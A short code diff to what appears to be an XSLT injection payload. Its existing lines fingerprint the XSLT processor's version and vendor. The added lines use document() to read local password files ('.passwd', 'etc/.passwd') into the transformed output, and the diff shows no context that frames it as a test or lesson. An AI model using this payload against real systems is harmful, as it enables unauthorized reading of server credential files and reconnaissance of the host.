@@ -5,6 +5,9 @@
   XSLT Version <xsl:value-of select="system-property('xsl:version')"/>
   XSLT Vendor <xsl:value-of select="system-property('xsl:vendor')"/>
   XSLT Vendor-URL <xsl:value-of select="system-property('xsl:vendor-url')"/>
+  Passwd <xsl:value-of select="document('.passwd')"/>
+  Passwd <xsl:value-of select="document('etc/.passwd')"/>
+  <xsl:value-of select="system-property('xsl:vendor-url')"/>
 </xsl:for-each>
 </body>
 </html> 
